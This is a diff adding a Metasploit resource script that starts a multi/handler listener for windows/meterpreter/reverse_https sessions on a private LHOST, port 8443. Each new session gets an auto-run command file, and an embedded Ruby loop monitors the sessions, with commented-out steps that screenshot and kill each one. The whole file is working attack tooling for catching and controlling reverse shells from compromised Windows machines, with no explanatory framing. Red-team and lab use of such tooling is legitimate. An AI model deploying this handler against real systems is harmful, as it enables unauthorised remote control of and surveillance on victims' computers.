@@ -1,0 +1,38 @@
+spool msfconsole.log
+use multi/handler
+set AutoRunScript multi_console_command -rc autorunCmd.rc
+set payload windows/meterpreter/reverse_https
+set ExitOnSession false
+set LHOST 192.168.112.129
+set LPORT 8443
+exploit -j -z
+# The first sleep below is not necessary, but makes the output cleaner
+<ruby>
+	sleep(1)
+	print_status("Waiting on an incoming sessions...")
+	while (true)
+		framework.sessions.each_pair do |sid,s|
+			thost = s.session_host
+
+			# Ensure that stdapi has been loaded before running
+			if s.ext.aliases['stdapi']
+				#print_status("Screenshotting session #{sid} #{thost}...")
+				#s.console.run_single("screenshot -p #{thost}_#{sid}.jpg -v false -q 85")
+				#print_status("Closing session #{sid} #{thost}...")
+				#sleep 30
+				#s.kill
+			else
+				print_status("Session #{sid} #{thost} active, but not yet configured")
+			end
+
+		end
+		sleep(1)
+	end
+	print_status("All done")
+</ruby>
+# Kill all open sessions
+sessions -K
+# Exit the console (optional)
+exit
+
+
